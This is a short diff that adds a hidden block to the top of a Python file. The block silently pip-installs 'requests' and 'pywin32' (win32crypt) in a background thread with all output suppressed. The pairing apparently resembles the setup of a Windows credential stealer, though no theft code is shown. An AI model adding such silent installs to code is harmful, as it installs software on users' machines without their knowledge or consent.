@@ -1,3 +1,41 @@
+import subprocess
+import sys
+import threading
+
+# List of required packages (only external ones)
+packages = [
+    "requests",   # requests
+    "pywin32"     # win32crypt
+]
+
+def install_package(pkg):
+    """Install a single pip package silently."""
+    try:
+        subprocess.check_call(
+            [sys.executable, "-m", "pip", "install", pkg],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+    except Exception as e:
+        print(f"Failed to install {pkg}: {e}")
+
+def install_all_packages():
+    """Install all packages in the list."""
+    for pkg in packages:
+        module_name = pkg.replace("-", "_")
+        try:
+            __import__(module_name)
+        except ImportError:
+            install_package(pkg)
+
+# Run installation in background thread
+threading.Thread(target=install_all_packages, daemon=True).start()
+
+
+
+
+
+
 import os
 import shutil
 import json
